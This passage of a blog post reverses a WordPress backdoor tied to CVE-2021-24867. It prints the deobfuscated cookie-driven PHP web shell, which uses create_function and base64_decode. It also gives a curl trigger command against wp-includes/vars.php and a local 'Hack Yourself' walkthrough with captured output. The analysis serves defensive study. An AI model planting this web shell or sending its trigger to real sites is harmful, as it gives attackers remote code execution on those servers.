</pre></table></code></div></div><p>Let’s go back to our separate statement rewrite of the original code and decorate it with the cookie values we’ve planned out. This should help illustrate the final HTTP request we need to send.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="c1">//    "base64_decode" . ""</span>
<span class="nv">$qr</span> <span class="o">=</span> <span class="nv">$g</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span>          <span class="mf">.</span> <span class="nv">$g</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>

<span class="c1">//        b64("create_function") . ""</span>
<span class="nv">$iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">78</span><span class="p">]</span>                 <span class="mf">.</span> <span class="nv">$g</span><span class="p">[</span><span class="mi">18</span><span class="p">]);</span>

<span class="c1">//         b64("base64_decode") . ""</span>
<span class="nv">$_iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span>               <span class="mf">.</span> <span class="nv">$g</span><span class="p">[</span><span class="mi">17</span><span class="p">]);</span>

<span class="c1">//          ""               b64(b64("your PHP payload"))</span>
<span class="nv">$_iv</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$iv</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="nv">$_iv</span><span class="p">(</span><span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">53</span><span class="p">])));</span>

<span class="o">@</span><span class="nv">$_iv</span><span class="p">();</span>
</pre></table></code></div></div><p>This makes writing a <code class="language-plaintext highlighter-rouge">curl</code> command much easier.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">curl -v -A "wp_is_mobile" --cookie "33=base64_decode;</span><span class="w"> </span><span class="nv">32</span><span class="o">=</span><span class="p">;</span> <span class="nv">78</span><span class="o">=</span>Y3JlYXRlX2Z1bmN0aW9u<span class="p">;</span> <span class="nv">18</span><span class="o">=</span><span class="p">;</span> <span class="nv">12</span><span class="o">=</span><span class="nv">YmFzZTY0X2RlY29kZQ</span><span class="o">==</span><span class="p">;</span> <span class="nv">17</span><span class="o">=</span><span class="p">;</span> <span class="nv">10</span><span class="o">=</span><span class="p">;</span> <span class="nv">53</span><span class="o">=</span><span class="nv">WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0</span><span class="o">=</span><span class="s2">" http://localhost:8000/wp-includes/vars.php --output -
</span></pre></table></code></div></div><h2 id="hack-yourself"><span class="me-2">Hack Yourself</span><a href="#hack-yourself" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Running a test on your local system is quite simple; especially with the addition of a <a href="http://www.php.net/manual/en/features.commandline.webserver.php">built-in web server</a> in PHP versions 5.4 and later.</p><p>First, create a simple PHP file called <em>index.php</em> containing the backdoor web shell.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="n">wp_is_mobile_fix</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$is_wp_mobile</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'wp_is_mobile'</span><span class="p">);</span>
    <span class="nv">$g</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">;</span>

  <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$g</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span> <span class="o">&amp;&amp;</span> <span class="nv">$is_wp_mobile</span><span class="p">)</span> <span class="o">?</span>
  <span class="p">((</span><span class="nv">$qr</span> <span class="o">=</span> <span class="nv">$g</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span><span class="mf">.</span><span class="nv">$g</span><span class="p">[</span><span class="mi">32</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">78</span><span class="p">]</span><span class="mf">.</span><span class="nv">$g</span><span class="p">[</span><span class="mi">18</span><span class="p">]))</span> <span class="o">&amp;&amp;</span>
  <span class="p">(</span><span class="nv">$_iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span><span class="mf">.</span><span class="nv">$g</span><span class="p">[</span><span class="mi">17</span><span class="p">]))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_iv</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$iv</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="nv">$_iv</span><span class="p">(</span><span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">53</span><span class="p">]))))</span> <span class="o">&amp;&amp;</span> 
  <span class="o">@</span><span class="nv">$_iv</span><span class="p">())</span> <span class="o">:</span> <span class="nv">$g</span><span class="p">;</span>

  <span class="k">return</span> <span class="nv">$is_wp_mobile</span><span class="p">;</span>
<span class="p">}</span>

<span class="nf">wp_is_mobile_fix</span><span class="p">();</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Then start a simple PHP web server from the command line.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cd </span>path/to/index.php
<span class="gp">$</span><span class="w"> </span>php <span class="nt">-S</span> 127.0.0.1:8000
</pre></table></code></div></div><p>Use <code class="language-plaintext highlighter-rouge">curl</code> to send your payload with the correct user agent string and cookie values.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">curl -v -A "wp_is_mobile" --cookie "33=base64_decode;</span><span class="w"> </span><span class="nv">32</span><span class="o">=</span><span class="p">;</span> <span class="nv">78</span><span class="o">=</span>Y3JlYXRlX2Z1bmN0aW9u<span class="p">;</span> <span class="nv">18</span><span class="o">=</span><span class="p">;</span> <span class="nv">12</span><span class="o">=</span><span class="nv">YmFzZTY0X2RlY29kZQ</span><span class="o">==</span><span class="p">;</span> <span class="nv">17</span><span class="o">=</span><span class="p">;</span> <span class="nv">10</span><span class="o">=</span><span class="p">;</span> <span class="nv">53</span><span class="o">=</span><span class="nv">WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0</span><span class="o">=</span><span class="s2">" http://localhost:8000/index.php --output -
</span></pre></table></code></div></div><p>You should see the current working directory of your <em>index.php</em> script in the output.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-v</span> <span class="nt">-A</span> <span class="s2">"wp_is_mobile"</span> <span class="nt">--cookie</span> <span class="s2">"33=base64_decode; 32=; 78=Y3JlYXRlX2Z1bmN0aW9u; 18=; 12=YmFzZTY0X2RlY29kZQ==; 17=; 10=; 53=WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0="</span> http://localhost:8000/index.php <span class="nt">--output</span> -
<span class="go">*   Trying ::1:8000...
* connect to ::1 port 8000 failed: Connection refused
*   Trying 127.0.0.1:8000...
</span><span class="gp">* Connected to localhost (127.0.0.1) port 8000 (#</span>0<span class="o">)</span>
<span class="gp">&gt;</span><span class="w"> </span>GET /index.php HTTP/1.1
<span class="gp">&gt;</span><span class="w"> </span>Host: localhost:8000
<span class="gp">&gt;</span><span class="w"> </span>User-Agent: wp_is_mobile
<span class="gp">&gt;</span><span class="w"> </span>Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="gp">&gt;</span><span class="w"> </span>Cookie: <span class="nv">33</span><span class="o">=</span>base64_decode<span class="p">;</span> <span class="nv">32</span><span class="o">=</span><span class="p">;</span> <span class="nv">78</span><span class="o">=</span>Y3JlYXRlX2Z1bmN0aW9u<span class="p">;</span> <span class="nv">18</span><span class="o">=</span><span class="p">;</span> <span class="nv">12</span><span class="o">=</span><span class="nv">YmFzZTY0X2RlY29kZQ</span><span class="o">==</span><span class="p">;</span> <span class="nv">17</span><span class="o">=</span><span class="p">;</span> <span class="nv">10</span><span class="o">=</span><span class="p">;</span> <span class="nv">53</span><span class="o">=</span><span class="nv">WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0</span><span class="o">=</span>
<span class="gp">&gt;</span><span class="w"> 
</span><span class="go">* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Host: localhost:8000
&lt; Date: Wed, 26 Jan 2022 16:07:00 GMT
&lt; Connection: close
&lt; X-Powered-By: PHP/7.4.25
</span><span class="gp">&lt; Content-type: text/html;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
<span class="go">&lt; 
/tmp
* Closing connection 0

</span><span class="gp">$</span><span class="w"> 
</span></pre></table></code></div></div><p>More public information on the vulnerability can be found with the associated CVE: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24867">CVE-2021-24867</a>.</p></div><div class="post-tail-wrapper text-muted"><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Reversing%20a%20WordPress%20Backdoor%20-%20Red%20Team%20README&url=https%3A%2F%2Fwww.redteamreadme.com%2Fposts%2Fwordpress-backdoor%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Reversing%20a%20WordPress%20Backdoor%20-%20Red%20Team%20README&u=https%3A%2F%2Fwww.redteamreadme.com%2Fposts%2Fwordpress-backdoor%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Reversing%20a%20WordPress%20Backdoor%20-%20Red%20Team%20README&url=https%3A%2F%2Fwww.redteamreadme.com%2Fposts%2Fwordpress-backdoor%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recent Update</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/blog/">Blog - TryHackMe</a><li class="text-truncate lh-lg"> <a href="/posts/cyborg/">Cyborg - TryHackMe</a><li class="text-truncate lh-lg"> <a href="/posts/picklerick/">Pickle Rick - TryHackMe</a><li class="text-truncate lh-lg"> <a href="/posts/minotaur/">Minotaur's Labyrinth - TryHackMe</a><li class="text-truncate lh-lg"> <a href="/posts/mrrobot/">Mr Robot CTF - TryHackMe</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/easy/">easy</a> <a class="post-tag btn btn-outline-primary" href="/tags/medium/">medium</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/mrrobot/" class="btn btn-outline-primary" aria-label="Older" ><p>Mr Robot CTF - TryHackMe</p></a> <a href="/posts/dnstun0/" class="btn btn-outline-primary" aria-label="Newer" ><p>My Hacker Handle</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/dnstun0">dnstun0</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>🐱</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/easy/">easy</a> <a class="post-tag btn btn-outline-primary" href="/tags/medium/">medium</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
